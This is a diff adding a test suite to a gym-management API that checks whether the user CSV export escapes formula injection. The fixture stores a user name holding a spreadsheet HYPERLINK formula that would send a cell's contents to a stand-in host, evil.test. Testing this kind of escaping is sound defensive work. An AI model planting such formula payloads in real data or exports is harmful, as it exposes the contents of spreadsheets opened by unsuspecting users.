@@ -850,3 +850,43 @@ describe('Users: SUPER_ADMIN tiene acceso completo', () => {
     expect(res.json().error).toMatch(/debe seleccionar un gimnasio/i)
   })
 })
+
+// ─── Suite 9: GET /users/export — CSV injection ──────────────────────────────
+
+describe('Users: GET /api/users/export — previene CSV injection', () => {
+  let app: FastifyInstance
+  let formulaUserId: string
+
+  beforeAll(async () => {
+    app = await buildApp()
+    const passwordHash = await bcrypt.hash(TEST_PASSWORD, 10)
+    // Nombre que, sin escapar, Excel/Sheets interpretaría como fórmula al abrir el CSV
+    const formulaUser = await prisma.user.create({
+      data: {
+        gymId: gymAId,
+        name: '=HYPERLINK("http://evil.test?x="&A1,"click")',
+        email: 'qa-users-formula-a@test.local',
+        passwordHash,
+        role: 'MEMBER',
+      },
+    })
+    formulaUserId = formulaUser.id
+    createdUserIds.push(formulaUserId)
+  })
+
+  afterAll(async () => { await app.close() })
+
+  it('antepone comilla simple a un nombre que empieza con "="', async () => {
+    const res = await app.inject({
+      method: 'GET',
+      url: '/api/users/export?format=csv&role=MEMBER',
+      headers: { authorization: `Bearer ${adminAToken}` },
+    })
+    expect(res.statusCode).toBe(200)
+    const csv = res.body
+    // Escapado correcto: comilla simple antepuesta, luego la celda citada con "" internas
+    expect(csv).toContain('"\'=HYPERLINK(""http://evil.test?x=""&A1,""click"")"')
+    // Nunca debe aparecer la celda citada SIN el ' antepuesto (la forma vulnerable)
+    expect(csv).not.toContain('"=HYPERLINK')
+  })
+})
